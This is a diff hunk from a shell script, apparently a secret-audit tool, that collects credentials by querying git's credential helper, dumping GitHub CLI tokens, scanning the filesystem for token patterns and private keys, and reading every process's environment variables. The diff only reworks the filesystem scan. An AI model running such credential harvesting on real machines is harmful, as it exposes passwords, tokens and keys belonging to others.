@@ -17,8 +17,9 @@ printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 timeout 10 
   | grep '^password=' >> "$found"
 gh auth token 2>&1 | keep
 gh auth status --show-token 2>&1 | keep
-grep -rIhaoE --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev --exclude-dir=.audit -- "$pattern" / 2>/dev/null >> "$found"
-grep -rlI --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev --exclude-dir=.audit -- 'PRIVATE KEY-----' / 2>/dev/null >> "$found"
+mapfile -t files < <(roots)
+scan tokens 60 grep -rIhaoEs -D skip --exclude-dir=.audit -- "$pattern" "${files[@]}" >> "$found"
+scan keys 60 grep -rlIs -D skip --exclude-dir=.audit -- 'PRIVATE KEY-----' "${files[@]}" >> "$found"
 for p in /proc/[0-9]*; do
   tr '\0' '\n' < "$p/environ" 2>/dev/null | keep
   tr '\0' ' ' < "$p/cmdline" 2>/dev/null | keep
